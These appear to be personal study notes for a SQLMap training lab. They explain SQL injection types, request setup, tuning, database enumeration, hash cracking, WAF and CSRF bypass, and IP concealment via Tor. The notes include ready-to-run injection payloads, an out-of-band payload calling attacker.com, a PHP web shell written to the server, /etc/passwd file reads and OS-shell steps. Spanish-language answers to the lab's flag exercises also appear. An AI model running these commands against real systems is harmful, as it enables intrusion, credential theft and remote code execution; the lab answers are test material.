# SQLMap Overview

**SQLMap** is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) vulnerabilities. It has been under continuous development since 2006 and remains actively maintained.

## Key Features

- **Detection and Exploitation**: Automates identifying and leveraging SQL injection vulnerabilities.
- **Supported Databases**: Extensive support for DBMSes, including MySQL, PostgreSQL, Oracle, and more.
- **SQL Injection Types**: Supports all known SQLi types.
- **Advanced Features**: Includes database content retrieval, file system access, and OS command execution.

### Installation

SQLMap is pre-installed on many security-focused OSs like Pwnbox. It can also be installed via package managers or manually:

#### Using a Package Manager (Debian):
```bash
sudo apt install sqlmap
```

#### Manual Installation:
```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```
Run SQLMap:
```bash
python sqlmap.py
```

### Supported Databases

SQLMap supports a wide range of DBMSes, including:

- **MySQL**, **PostgreSQL**, **Oracle**, **Microsoft SQL Server**
- **SQLite**, **MariaDB**, **IBM DB2**, **Sybase**, and many more.

### SQL Injection Types

#### Boolean-based Blind SQL Injection

- Example: `AND 1=1`
- Differentiates TRUE/FALSE results based on server responses.
- Common in web applications.

#### Error-based SQL Injection

- Example: `AND GTID_SUBSET(@@version,0)`
- Utilizes database error messages to retrieve data.
- Faster than Boolean-based SQLi.

#### UNION Query-based SQL Injection

- Example: `UNION ALL SELECT 1,@@version,3`
- Merges query results with injected statements.
- Fastest SQLi type.

#### Stacked Queries

- Example: `; DROP TABLE users`
- Executes multiple SQL statements in one query.
- Requires platform support (e.g., Microsoft SQL Server).

#### Time-based Blind SQL Injection

- Example: `AND 1=IF(2>1,SLEEP(5),0)`
- Differentiates TRUE/FALSE results using response times.
- Slower than Boolean-based SQLi.

#### Inline Queries

- Example: `SELECT (SELECT @@version) FROM`
- Embeds queries within original queries.
- Rare but supported.

#### Out-of-band SQL Injection

- Example: `LOAD_FILE(CONCAT('\\',@@version,'.attacker.com\README.txt'))`
- Uses alternative communication channels like DNS exfiltration.
- Useful when other types are too slow or unsupported.

## Example Usage

Run SQLMap on a vulnerable URL:
```bash
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

### Output:
```bash
[INFO] testing if GET parameter 'id' is dynamic
[INFO] GET parameter 'id' is dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[INFO] testing for SQL injection on GET parameter 'id'
...SNIP...
```

### Techniques:
List SQLi techniques with:
```bash
sqlmap -hh
```
Techniques include:
- **B**: Boolean-based blind
- **E**: Error-based
- **U**: Union query-based
- **S**: Stacked queries
- **T**: Time-based blind
- **Q**: Inline queries

## Conclusion

SQLMap is an essential tool for penetration testers, providing robust capabilities to detect and exploit SQLi vulnerabilities across a wide range of database systems and injection techniques.

---

# Getting Started with SQLMap

SQLMap is a powerful tool for detecting and exploiting SQL injection vulnerabilities. Here’s a guide to get started with SQLMap, its commands, and examples.

## Help Messages

### Basic Help
Basic options and switches:
```bash
sqlmap -h
```

Output example:
```
Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs
```

### Advanced Help
Comprehensive options and switches:
```bash
sqlmap -hh
```

Output example:
```
Usage: python3 sqlmap [options]

Options:
  Target:
    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -d DIRECT           Connection string for direct database connection
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
```

Refer to the [SQLMap wiki](http://sqlmap.org/) for more details.

## Basic Scenario
A penetration tester may encounter a web page vulnerable to SQL injection via a GET parameter, such as:

Example vulnerable PHP code:
```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

### Testing for SQL Injection
Using SQLMap to test this scenario:
```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

Output example:
```
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] testing if GET parameter 'id' is dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
...
[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable
```

### Identified Injection Points
SQLMap provides details on injection points:
```
Parameter: id (GET)
    Type: boolean-based blind
    Payload: id=1 AND 8814=8814

    Type: error-based
    Payload: id=1 AND (SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2)) FROM INFORMATION_SCHEMA.PLUGINS)

    Type: time-based blind
    Payload: id=1 AND (SELECT SLEEP(5))

    Type: UNION query
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
```

## SQL Injection Types Detected
- **Boolean-based blind**: Tests TRUE/FALSE conditions.
- **Error-based**: Exploits database error messages.
- **Time-based blind**: Measures response delay for TRUE/FALSE conditions.
- **Union query-based**: Retrieves data via UNION statements.

### Example Payloads:
- Boolean-based: `id=1 AND 1=1`
- Error-based: `id=1 AND GTID_SUBSET(@@version,0)`
- Time-based: `id=1 AND IF(1=1,SLEEP(5),0)`
- Union query: `id=1 UNION ALL SELECT NULL,NULL,@@version`

## Summary
SQLMap simplifies detecting and exploiting SQL injection vulnerabilities. By understanding its options, commands, and output, penetration testers can effectively evaluate and exploit vulnerable systems.

---

# SQLMap Output Description

When using SQLMap, the output is crucial for understanding the SQL injection (SQLi) process, identifying vulnerabilities, and determining exploitable parameters. Here’s a breakdown of the most common log messages and their meanings:

## Common Log Messages

### URL Content is Stable
**Log Message:**
```
"target URL content is stable"
```
**Description:**
- Indicates that responses to repeated identical requests do not vary significantly.
- Ensures easier identification of differences caused by SQLi attempts.

---

### Parameter Appears to Be Dynamic
**Log Message:**
```
"GET parameter 'id' appears to be dynamic"
```
**Description:**
- Suggests the tested parameter responds to changes in its value.
- A static response implies the parameter is not linked to a database.

---

### Parameter Might Be Injectable
**Log Message:**
```
"heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"
```
**Description:**
- Indicates potential SQLi vulnerability based on database error responses.
- Further testing is needed to confirm.

---

### Parameter Might Be Vulnerable to XSS
**Log Message:**
```
"heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"
```
**Description:**
- Performs quick heuristic checks for XSS vulnerabilities during SQLMap scans.

---

### Back-End DBMS Detected
**Log Message:**
```
"it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"
```
**Description:**
- Narrows testing to the detected DBMS (e.g., MySQL), reducing the scope and duration of tests.

---

### Extending Level/Risk Values
**Log Message:**
```
"for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"
```
**Description:**
- Runs additional SQLi payloads for the identified DBMS, increasing detection accuracy.

---

### Reflective Values Found
**Log Message:**
```
"reflective value(s) found and filtering out"
```
**Description:**
- Indicates reflective payloads in server responses, which SQLMap filters out to improve accuracy.

---

### Parameter Appears to Be Injectable
**Log Message:**
```
"GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string='luther')"
```
**Description:**
- Confirms the parameter is injectable.
- Uses a static string (e.g., `luther`) to distinguish TRUE/FALSE responses.

---

### Time-Based Comparison Statistical Model
**Log Message:**
```
"time-based comparison requires a larger statistical model, please wait........... (done)"
```
**Description:**
- Collects response time data to identify deliberate delays caused by time-based SQLi.

---

### Extending UNION Query Injection Tests
**Log Message:**
```
"automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"
```
**Description:**
- Extends UNION query tests due to a high likelihood of success.

---

### Technique Appears to Be Usable
**Log Message:**
```
"'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"
```
**Description:**
- Uses `ORDER BY` to quickly determine the number of columns needed for UNION query injections.

---

### Parameter Is Vulnerable
**Log Message:**
```
"GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"
```
**Description:**
- Confirms the parameter is vulnerable to SQLi.
- Option to continue testing additional parameters.

---

### SQLMap Identified Injection Points
**Log Message:**
```
"sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"
```
**Description:**
- Lists identified injection points, including types, titles, and payloads.

---

### Data Logged to Text Files
**Log Message:**
```
"fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"
```
**Description:**
- Indicates the storage location for logs, session files, and results.
- Session files reduce the need for repeated requests in future runs.

---

## Summary
Understanding SQLMap's output helps testers:
- Identify SQLi vulnerabilities.
- Report precise injection types.
- Optimize manual exploitation based on confirmed vulnerabilities.

---

# Running SQLMap on an HTTP Request

SQLMap provides numerous options and switches to set up HTTP requests effectively for SQL injection testing. Missteps like incorrect cookies or improperly formatted POST data can hinder successful detection and exploitation.

## Using cURL Commands

The "Copy as cURL" feature from browser developer tools simplifies SQLMap setup. Replace `curl` with `sqlmap` in the command.

Example:
```bash
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0)' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

## GET and POST Requests

### GET Requests
Use the `-u` or `--url` option:
```bash
sqlmap 'http://www.example.com/?id=1'
```

### POST Requests
Specify POST data with `--data`:
```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

To test a specific parameter, mark it with `*`:
```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

## Full HTTP Requests

For complex requests, use the `-r` flag with a request file.

### Example Request File (captured via Burp):
```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
```

Run SQLMap with the file:
```bash
sqlmap -r req.txt
```

Mark injection points inside the file using `*`, e.g., `/id=*`.

## Custom Requests and Headers

Specify session cookies or headers:
```bash
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap ... -H='Cookie: PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

Randomize the User-Agent header to avoid detection:
```bash
sqlmap ... --random-agent
```

Specify alternative HTTP methods (e.g., PUT):
```bash
sqlmap -u www.target.com --data='id=1' --method PUT
```

## Custom Body Formats

SQLMap supports POST data in JSON, XML, or other formats. For complex bodies, use `-r`:

### JSON Request Example
```json
{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z"
    }
  }]
}
```
Save this to a file (`req.txt`) and run:
```bash
sqlmap -r req.txt
```

### XML Request Example
```xml
<element>
  <id>1</id>
</element>
```
Save this to a file and test similarly.

## Summary
- Use `--data` for simple POST bodies or `-r` for complex requests.
- Randomize User-Agent headers and test different HTTP methods.
- Mark injection points explicitly with `*` for precise testing.
- Leverage JSON and XML support for modern APIs.


Ejercicio1
  What's the contents of table flag2? (Case #2)
    Copiar el curl y hacer el sqlmap

Ejercicio2
  What's the contents of table flag3? (Case #3)
    Vale este cuesta mas, interceptar desde burpsuite el http y guardarlo y luego suar este codigo ```sqlmap -r Case3.txt -p cookie --dump```

Ejercicio3
   What's the contents of table flag4? (Case #4)
     Es hacer el intercept dejarlo pasar, copiarlo y hacer ```sqlpmap -r Case4.txt```

---

# Handling SQLMap Errors

When using SQLMap, errors or misconfigurations can arise. This guide provides methods to identify and resolve issues effectively.

## Display Errors

Enable the `--parse-errors` option to parse and display DBMS errors during the scan.

### Example Output:
```bash
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '))"',),)((' at line 1'
```

### Use Case:
- SQLMap displays DBMS errors to help identify and address SQL syntax or vulnerability issues.

---

## Store the Traffic

Use the `-t` option to store all HTTP requests and responses to a file for manual inspection.

### Example:
```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

cat /tmp/traffic.txt
```

### Output:
- File `/tmp/traffic.txt` contains:
  - Full HTTP requests and responses.
  - Enables manual investigation to locate issues.

---

## Verbose Output

Increase the verbosity of SQLMap’s output using the `-v` flag. Verbosity levels range from 0 (default) to 6 (maximum).

### Example:
```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

### Benefits:
- Debugging details such as:
  - HTTP request headers and responses.
  - Connection details and configurations.
  - Dynamic testing steps.

---

## Using Proxy

The `--proxy` option routes all SQLMap traffic through a proxy (e.g., Burp Suite) for further analysis.

### Example:
```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --proxy="http://127.0.0.1:8080"
```

### Benefits:
- Allows traffic monitoring and manual inspection through the proxy.
- Enables advanced testing and debugging using Burp Suite features.

---

## Summary

To address SQLMap errors effectively:
1. **Use `--parse-errors`** to display DBMS errors.
2. **Store traffic** with `-t` for manual investigation.
3. **Enable verbose output** with `-v` to monitor actions in real-time.
4. **Route through a proxy** with `--proxy` for advanced debugging.

By following these steps, you can identify and resolve issues encountered during SQLMap scans.

---

# Attack Tuning

In most cases, SQLMap runs effectively with default settings. However, specific scenarios might require fine-tuning SQL injection (SQLi) attempts. This guide outlines options for enhancing SQLMap's detection phase.

## Understanding Payloads

Each payload consists of:

- **Vector:** The core SQL code to execute (e.g., `UNION ALL SELECT 1,2,VERSION()`).
- **Boundaries:** Prefixes and suffixes used to embed the vector in the vulnerable SQL statement (e.g., `<vector>-- -`).

---

## Prefix and Suffix

Use `--prefix` and `--suffix` for special cases requiring custom boundaries.

### Example:
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

#### Vulnerable Code:
```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

#### Resulting Payload:
```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

---

## Level and Risk Options

- **`--level` (1-5, default 1):** Expands vectors and boundaries based on success probability.
- **`--risk` (1-3, default 1):** Adds vectors based on potential risk to the database (e.g., `DELETE` or `UPDATE`).

### Example:
```bash
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

### Output:
```bash
[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
```

With default `--level` and `--risk` values, fewer boundaries and payloads are tested:

```bash
sqlmap -u www.example.com/?id=1 -v 3
[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
[14:20:36] [PAYLOAD] 1 AND 7496=4313
```

### Comparison of Payloads:

Default settings:
```bash
sqlmap -u www.example.com/?id=1
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
```

With `--level=5` and `--risk=3`:
```bash
sqlmap -u www.example.com/?id=1 --level=5 --risk=3
[INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
```

By default, up to 72 payloads are tested per parameter. With `--level=5` and `--risk=3`, this increases to over 7,800 payloads.

---

## Advanced Tuning

### Status Codes
Use `--code=<status>` to target HTTP responses with specific status codes (e.g., `200` for TRUE responses).

### Titles
Use `--titles` to compare HTML `<title>` tags for differences between responses.

### Strings
Use `--string=<value>` to focus on specific strings present in TRUE responses.

### Text-only
Use `--text-only` to compare visible content, ignoring HTML tags.

### Techniques
Use `--technique=<types>` to restrict SQLi tests to specific techniques.

#### Example:
```bash
sqlmap -u www.example.com/?id=1 --technique=BEU
```
- Tests only boolean-based blind (`B`), error-based (`E`), and UNION-based (`U`) techniques.

---

## UNION SQLi Tuning

### Columns and Characters
- Use `--union-cols=<num>` to specify the number of columns.
- Use `--union-char=<char>` to define alternative values.

### FROM Clause
For databases like Oracle, use `--union-from=<table>` to specify a table for the UNION query.

---

## Summary

- **Use `--prefix` and `--suffix`:** For custom boundaries.
- **Adjust `--level` and `--risk`:** To increase coverage.
- **Fine-tune with advanced options:** Use `--code`, `--titles`, `--string`, `--text-only`, and `--technique`.
- **Optimize UNION SQLi:** Specify columns, characters, or FROM clauses when needed.

SQLMap's flexibility allows precise tuning for specific scenarios, making it a powerful tool for SQL injection detection and exploitation.

Ejercicio4
  What's the contents of table flag5? (Case #5)
  sqlmap -r Case5.txt --batch --dbs para sacar la base de datos
    sqlmap -r Case5.txt --batch --dump -T flag5 -D testdb --no-cast --time-sec=10 --level=5 --risk=3, el --batch,--dump, llevel y risk usarlo casi siempre, el time cuando vaya lento o de un error de lag

Ejercicio5
  What's the contents of table flag6? (Case #6)
    sqlmap -r Case6.txt --batch --dump -T flag6 -D testdb --no-cast --level=5 --risk=3 --prefix='`)' --> como se que es ese prefijo, un writeup

Ejercicio6
  What's the contents of table flag7? (Case #7)
    sqlmap -r Case7.txt --batch --dump -T flag7 -D testdb --no-cast --level=5 --risk=3 --union-cols=5 --dbms=MySQL

---

# Advanced Database Enumeration

## DB Schema Enumeration

To retrieve the structure of all tables for a complete overview of the database architecture, use the `--schema` switch:

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

**Example Output:**

```plaintext
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+

Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+
```

## Searching for Data

### Searching for Tables
To find all table names containing a specific keyword (e.g., `user`):

```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

**Example Output:**

```plaintext
Database: testdb
[1 table]
+-----------------+
| users           |
+-----------------+

Database: master
[1 table]
+-----------------+
| users           |
+-----------------+
```

### Searching for Columns
To search for all column names containing a specific keyword (e.g., `pass`):

```bash
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

**Example Output:**

```plaintext
columns LIKE 'pass' were found in the following databases:
Database: owasp10
Table: accounts
[1 column]
+----------+------+  
| Column   | Type |
+----------+------+  
| password | text |
+----------+------+  
```

## Password Enumeration and Cracking

### Dumping Table Data
To dump a specific table containing passwords:

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

**Example Output:**

```plaintext
[INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N

do you want to crack them via a dictionary-based attack? [Y/n/q] Y

[INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1

[INFO] starting dictionary-based cracking (sha1_generic_passwd)
```

**Example Cracked Data:**

```plaintext
Database: master
Table: users
[32 entries]
+----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------+
| id | cc               | name              | email                       | phone        | address                | birthday          | password                      |
+----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------+
| 1  | 5387278172507117 | Maynard Rice      | MaynardMRice@yahoo.com      | 281-559-0172 | 1698 Bird Spring Lane  | March 1 1958      | 3052                          |
| 2  | 4539475107874477 | Julio Thomas      | JulioWThomas@gmail.com      | 973-426-5961 | 1207 Granville Lane    | February 14 1972  | taqris                        |
```

### Cracking Database User Passwords
To dump and crack database-specific credentials:

```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

**Example Output:**

```plaintext
[INFO] cracked password 'testpass' for user 'root'
database management system users password hashes:
[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass
```

### Automating Enumeration
Use the `--all` and `--batch` switches to automate the entire enumeration process:

```bash
sqlmap -u "http://www.example.com/?id=1" --all --batch
```

Ejercicio7
  What's the name of the column containing "style" in it's name? (Case #1)
    ```sqlmap -r Case1.txt --batch --search -C style```

Ejercicio8
  What's the Kimberly user's password? (Case #1)
    ```sqlmap -r Case1.txt --batch --dump -D testdb -T users```

---

# Bypassing Web Application Protections

## Anti-CSRF Token Bypass

Anti-CSRF tokens are used to prevent automated tools from exploiting web applications. SQLMap can bypass this protection using the `--csrf-token` option. By specifying the token parameter name, SQLMap automatically updates the token value from the target response for subsequent requests.

### Example Command:
```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

### Output:
```plaintext
POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
```

---

## Unique Value Bypass

Some web applications require unique values for specific parameters. SQLMap can randomize such parameter values using the `--randomize` option.

### Example Command:
```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

### Example Output:
```plaintext
URI: http://www.example.com:80/?id=1&rp=99954
URI: http://www.example.com:80/?id=1&rp=87216
```

---

## Calculated Parameter Bypass

When web applications require parameter values to be calculated (e.g., hashes), the `--eval` option allows users to specify Python code for generating values before sending requests.

### Example Command:
```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

### Example Output:
```plaintext
URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
```

---

## IP Address Concealing

To bypass IP address blacklisting or conceal the attacker's IP, SQLMap supports:

- **Proxy:** Use the `--proxy` option to specify a SOCKS4/5 or HTTP proxy.
- **Tor:** Use the `--tor` option for anonymization via the Tor network. Verify Tor usage with `--check-tor`.

### Example Command:
```bash
sqlmap -u "http://www.example.com/" --proxy="socks4://177.39.187.70:33283" --check-tor
```

---

## WAF Bypass

SQLMap detects Web Application Firewalls (WAFs) and attempts to identify them using a third-party library, `identYwaf`. To avoid detection, use:

- `--skip-waf`: Skip WAF detection.
- `--tamper`: Use tamper scripts to obfuscate SQL payloads.

### Example Command with Tamper Scripts:
```bash
sqlmap -u "http://www.example.com/" --tamper=randomcase,space2comment
```

---

## Tamper Scripts

Tamper scripts modify SQL payloads to bypass protections like WAF/IPS. Multiple scripts can be chained using the `--tamper` option.

### Example Scripts:
- **`randomcase`**: Randomizes case for keywords (e.g., `SELECT` → `SeLeCt`).
- **`space2comment`**: Replaces spaces with comments (`/*`).
- **`between`**: Replaces `>` with `NOT BETWEEN 0 AND #` and `=` with `BETWEEN # AND #`.

### Example Command:
```bash
sqlmap -u "http://www.example.com/" --tamper=space2comment,randomcase
```

### Listing All Tamper Scripts:
```bash
sqlmap --list-tampers
```

---

## Miscellaneous Bypasses

### Chunked Transfer Encoding
Splits POST request bodies into "chunks" to bypass keyword filters.

### HTTP Parameter Pollution (HPP)
Splits payloads across multiple parameters with the same name.

### Example Commands:
```bash
sqlmap -u "http://www.example.com/" --chunked
sqlmap -u "http://www.example.com/?id=1&id=UNION&id=SELECT" --batch
```

Ejercicio9
  What's the contents of table flag8? (Case #8)
    sqlmap -r Case8.txt --csrf-token=t0ken --dump --batch --level=5 --risk=3

Ejercicio10
  What's the contents of table flag9? (Case #9)
    ```sqlmap -r Case9.txt -T falg9 --dump --batch --level=5 --risk=3 --randomize=uid```

Ejercicio11
  What's the contents of table flag10? (Case #10)
    ```sqlmap -r Case10.txt -T flag10 --dump --batch --level=5 --risk=3```

Ejercicio12
   What's the contents of table flag11? (Case #11)
     https://github.com/thryb/sqlmap-tamper
     sqlmap -r Case11.txt -T flag11 --dump --batch --level=5 --risk=3 --tamper=greatest --threads=10


---

# OS Exploitation with SQLMap

## File Read/Write

SQLMap can exploit SQL Injection vulnerabilities to read and write files on the target system, provided the necessary privileges exist.

### Reading Local Files
To read a file, use the `--file-read` option. For example:

```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

**Example Output:**
```plaintext
[INFO] fetching file: '/etc/passwd'
do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y
[INFO] the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)
```

View the downloaded file:

```bash
cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
```

### Writing Local Files
To write files to the target server, use the `--file-write` and `--file-dest` options. For example:

Prepare a basic PHP shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Write the shell to the target:

```bash
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

**Example Output:**
```plaintext
[INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
```

Access the shell and execute commands:

```bash
curl http://www.example.com/shell.php?cmd=ls+-la
```

---

## Checking DBA Privileges

To check if the current user has DBA privileges:

```bash
sqlmap -u "http://www.example.com/?id=1" --is-dba
```

**Example Output:**
```plaintext
current user is DBA: True
```

If `True`, the user may have permission to read or write local files.

---

## OS Command Execution

SQLMap can provide an interactive OS shell through SQL Injection vulnerabilities.

### Using `--os-shell`

Execute commands directly:

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

**Example Output:**
```plaintext
os-shell> ls -la
do you want to retrieve the command standard output? [Y/n/a] a
```

### Specify SQL Injection Technique
If the default method fails, specify a different SQLi technique (e.g., Error-based):

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

SQLMap will prompt for details such as the web application language and server directory. Defaults can be selected automatically by adding `--batch`.

---

## Summary

SQLMap's OS exploitation capabilities include:

- **File Read/Write**: Exploiting SQLi to access or write files on the target.
- **Privilege Checks**: Verifying DBA privileges for advanced operations.
- **Command Execution**: Dropping an interactive shell or uploading scripts for remote code execution.

With proper privileges, these tools make SQLMap a powerful option for testing and exploiting SQL Injection vulnerabilities.


Ejercicio13
  Try to use SQLMap to read the file "/var/www/html/flag.txt".
    sqlmap -r Case12.txt --file-read '/var/www/html/flag.txt'

Ejercicio14
  Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.
    sqlmap -r Case12.txt --os-shell --threads 10 --batch
    ls /
    cat /flag,txt

---


# Skills Assessment

## Objective
You are tasked with identifying an SQL Injection (SQLi) vulnerability in a web application and exploiting it using SQLMap. The goal is to retrieve the hidden flag and submit it to complete the module.

What's the contents of table final_flag?
  buscar el mejor sitio para hacer el intercept con burpsuite --> shop 
  sqlmap -r Case13.txt --threads=10 -T final_flag --dump --batch --tamper=between

    
